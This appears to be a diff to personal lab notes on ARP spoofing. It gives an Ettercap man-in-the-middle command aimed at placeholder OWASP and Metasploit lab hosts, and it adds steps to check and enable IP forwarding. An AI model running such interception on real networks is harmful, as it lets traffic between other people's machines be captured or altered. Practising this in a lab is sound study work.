@@ -3,3 +3,11 @@
 
 /* ARP spoof Ettercap */
 >>> ettercap -i eth0 -T -M arp:remote /<owasp_ip>// /<metasploit_ip>//
+
+/*enable ip forward before ARP spoof */
+/*Although it is enable by default */
+
+>>> cat /proc/sys/net/ipv4/ip_forward
+if output is 0: Then
+>>> echo 1> /proc/sys/net/ipv4/ip_forward
+
